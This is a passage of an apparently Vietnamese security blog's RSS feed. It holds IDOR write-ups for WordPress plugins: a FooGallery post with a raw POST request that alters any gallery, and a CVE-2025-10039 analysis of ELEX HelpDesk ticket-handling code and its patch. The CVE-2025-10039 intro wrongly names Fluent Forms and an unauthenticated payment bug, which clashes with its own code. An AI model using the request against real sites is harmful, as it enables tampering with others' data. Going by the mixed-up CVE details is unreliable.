start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request ƒë·ªÉ thay ƒë·ªïi data c·ªßa gallery b·∫•t k·ª≥&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_save&amp;amp;nonce=11bfc5f814&amp;amp;foogallery[]=any_data&amp;amp;img_id=1&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;S·ª≠ d·ª•ng UI ƒë·ªÉ th·ª±c hi·ªán:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy c·∫≠p &lt;code&gt;http://localhost/wp-admin/post.php?post=post_id&amp;amp;action=edit#&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Th·ª±c hi·ªán edit v√† save&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#34; title=&#34;Edit and save&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Edit&lt;/h2&gt;&lt;p&gt;Edit and save&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#39; alt=&#34;Edit&#34; height=&#34;1002&#34; width=&#34;1879&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit and save&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng x·∫£y ra do &lt;strong&gt;thi·∫øu ki·ªÉm tra quy·ªÅn truy c·∫≠p (authorization)&lt;/strong&gt; ƒë·ªëi v·ªõi &lt;code&gt;img_id&lt;/code&gt;.&lt;br&gt;&#xA;M·∫∑c d√π c√≥ ki·ªÉm tra nonce, plugin v·∫´n cho ph√©p ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p thao t√°c l√™n &lt;strong&gt;gallery kh√¥ng thu·ªôc quy·ªÅn s·ªü h·ªØu&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;br&gt;&#xA;B·∫£n v√° 2.4.30 kh·∫Øc ph·ª•c b·∫±ng c√°ch ki·ªÉm tra &lt;code&gt;current_user_can( &#39;edit_post&#39;, $img_id )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce &lt;strong&gt;kh√¥ng thay th·∫ø&lt;/strong&gt; cho ki·ªÉm so√°t quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;Ph·∫£i ki·ªÉm tra quy·ªÅn theo &lt;strong&gt;ƒë·ªëi t∆∞·ª£ng c·ª• th·ªÉ (object-level)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng tin d·ªØ li·ªáu client, k·ªÉ c·∫£ khi c√≥ nonce&lt;/li&gt;&#xA;&lt;li&gt;IDOR th∆∞·ªùng xu·∫•t hi·ªán trong AJAX handler thi·∫øu &lt;code&gt;current_user_can()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin &amp;lt;= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10039 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</link>
      <pubDate>Sun, 28 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-28-cve-2025-10039/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms ‚Äì Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; t·ªìn t·∫°i &lt;strong&gt;l·ªó h·ªïng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n &lt;strong&gt;‚â§ 3.2.9&lt;/strong&gt; th√¥ng qua tham s·ªë &lt;code&gt;submission_id&lt;/code&gt; trong endpoint x√°c nh·∫≠n thanh to√°n SCA.&#xA;L·ªó h·ªïng cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;ƒë√°nh d·∫•u submission c·ªßa ng∆∞·ªùi kh√°c l√† failed&lt;/strong&gt;, g√¢y gi√°n ƒëo·∫°n qu√° tr√¨nh thanh to√°n.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10039&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10039&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elex-helpdesk-customer-support-ticket-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.2.9&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω AJAX handler &lt;strong&gt;cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_eh_crm_ticket_single_view_client&amp;#39;, array( &amp;#39;CRM_Ajax&amp;#39;, &amp;#39;eh_crm_ticket_single_view_client&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (Subcriber+). Khi c√≥ request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=eh_crm_ticket_single_view_client&lt;/code&gt; th√¨ callback &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client() {&#xA;    if ( wp_verify_nonce( isset( $_POST[&amp;#39;nonce&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;nonce&amp;#39;] ) : &amp;#39;&amp;#39;, &amp;#39;wsdesk_nonce&amp;#39; ) ) {&#xA;        $ticket_id = isset( $_POST[&amp;#39;ticket_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;ticket_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $content   = self::eh_crm_ticket_single_view_client_gen( $ticket_id );&#xA;        wp_send_json_success( array( &amp;#39;page&amp;#39; =&amp;gt; $content ) );&#xA;        die;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra &lt;code&gt;nonce&lt;/code&gt; gi√∫p ch·ªëng CSRF&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ l·∫•y &lt;code&gt;ticket_id&lt;/code&gt; t·ª´ request, g·ªçi h√†m &lt;code&gt;eh_crm_ticket_single_view_client_gen()&lt;/code&gt; x·ª≠ l√Ω, l·∫•y n·ªôi dung c·ªßa ticket t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;ticker_id&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng tr·∫£ v·ªÅ n·ªôi dung d·∫°ng JSON.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) {&#xA;&#xA;    // L·∫•y d·ªØ li·ªáu ticket d·ª±a tr√™n ticket_id do user truy·ªÅn v√†o&#xA;    $current      = eh_crm_get_ticket( array( &amp;#39;ticket_id&amp;#39; =&amp;gt; $ticket_id ) );&#xA;    $current_meta = eh_crm_get_ticketmeta( $ticket_id );&#xA;&#xA;    // L·∫•y th√¥ng tin ng∆∞·ªùi d√πng n·ªôi b·ªô (agent/admin)&#xA;    $users_data = get_users( array(&#xA;        &amp;#39;role__in&amp;#39; =&amp;gt; array( &amp;#39;administrator&amp;#39;, &amp;#39;WSDesk_Agents&amp;#39;, &amp;#39;WSDesk_Supervisor&amp;#39; )&#xA;    ));&#xA;&#xA;    ...&#xA;&#xA;    // Render n·ªôi dung ticket (HTML output)&#xA;    echo esc_html( $current[0][&amp;#39;ticket_title&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_email&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_date&amp;#39;] );&#xA;&#xA;    ...&#xA;&#xA;    // Hi·ªÉn th·ªã n·ªôi dung h·ªôi tho·∫°i, file ƒë√≠nh k√®m, metadata&#xA;    self::eh_crm_ticket_reply_section_gen_client( $ticket_id );&#xA;&#xA;    ...&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;eh_crm_ticket_single_view_client_gen&lt;/code&gt; v√† &lt;code&gt;eh_crm_get_ticketmeta&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ truy xu·∫•t d·ªØ li·ªáu c·ªßa ticket:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticket( $args, $fields = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;$query = wpFluent()-&amp;gt;table( tables: &amp;#39;wsdesk_tickets&amp;#39; )-&amp;gt;where( &amp;#39;ticket_trash&amp;#39;, 0 );&#xA;&#xA;&#x9;if ( null !== $fields ) {&#xA;&#x9;&#x9;$fields = is_array( $fields ) ? $fields : array( $fields );&#xA;&#x9;&#x9;foreach ( $fields as $field ) {&#xA;&#x9;&#x9;&#x9;$query-&amp;gt;select( $field );&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( is_array( $args ) ) {&#xA;&#x9;&#x9;foreach ( $args as $key =&amp;gt; $value ) {&#xA;&#x9;&#x9;&#x9;$allowed_fileds = array( &amp;#39;ticket_id&amp;#39;, &amp;#39;ticket_author&amp;#39;, &amp;#39;ticket_email&amp;#39;, &amp;#39;ticket_date&amp;#39;, &amp;#39;ticket_title&amp;#39;, &amp;#39;ticket_parent&amp;#39;, &amp;#39;ticket_category&amp;#39;, &amp;#39;ticket_vendor&amp;#39;, &amp;#39;ticket_trash&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( in_array( $key, $allowed_fileds, true ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$query-&amp;gt;where( $key, $value );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;$ticket = (array) $query-&amp;gt;first();&#xA;&#xA;&#x9;if ( ! $ticket ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#xA;&#x9;if ( isset( $ticket[&amp;#39;ticket_content&amp;#39;] ) ) {&#xA;&#x9;&#x9;$ticket[&amp;#39;ticket_content&amp;#39;] = wp_kses_post( $ticket[&amp;#39;ticket_content&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;return array( $ticket );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticketmeta( $id, $key = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;global $wpdb;&#xA;&#x9;$data     = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d&amp;#39;, (int) $id ), ARRAY_A );&#xA;&#x9;$retrived = array();&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;$data = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s&amp;#39;, (int) $id, $key ), ARRAY_A );&#xA;&#x9;}&#xA;&#x9;if ( ! $data ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;return maybe_unserialize( $data[0][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;for ( $i = 0; $i &amp;lt; count( $data ); $i&amp;#43;&amp;#43; ) {&#xA;&#x9;&#x9;$retrived[ $data[ $i ][&amp;#39;meta_key&amp;#39;] ] = maybe_unserialize( $data[ $i ][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;return maybe_unserialize( $retrived );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra n√†o ƒë·ªÉ x√°c nh·∫≠n ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ ph·∫£i l√† ch·ªß s·ªü h·ªØu ticket hay kh√¥ng, c√≥ quy·ªÅn xem ticket n√†y hay kh√¥ng =&amp;gt; IDOR&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° v3.3.0&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#34; title=&#34;B·∫£n v√° v3.3.0&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√° v3.3.0&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#39; alt=&#34;Patch&#34; height=&#34;693&#34; width=&#34;1888&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√° v3.3.0&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ &lt;strong&gt;ngƒÉn ch·∫∑n IDOR b·∫±ng c√°ch r√†ng bu·ªôc quy·ªÅn truy c·∫≠p theo ng∆∞·ªùi d√πng&lt;/strong&gt;, c·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;So s√°nh &lt;code&gt;ticket_author&lt;/code&gt; v·ªõi &lt;code&gt;current_user_id&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o ng∆∞·ªùi xem l√† ch·ªß s·ªü h·ªØu ticket&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ cho ph√©p truy c·∫≠p n·∫øu ng∆∞·ªùi d√πng thu·ªôc nh√≥m ƒë∆∞·ª£c c·∫•p quy·ªÅn (&lt;code&gt;administrator&lt;/code&gt;, &lt;code&gt;WSDesk_Agents&lt;/code&gt;, &lt;code&gt;WSDesk_Supervisor&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;T·ª´ ch·ªëi m·ªçi truy c·∫≠p kh√¥ng h·ª£p l·ªá tr∆∞·ªõc khi tr·∫£ d·ªØ li·ªáu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, kh√¥ng th·ªÉ truy c·∫≠p ticket c·ªßa ng∆∞·ªùi kh√°c ch·ªâ b·∫±ng c√°ch thay ƒë·ªïi &lt;code&gt;ticket_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 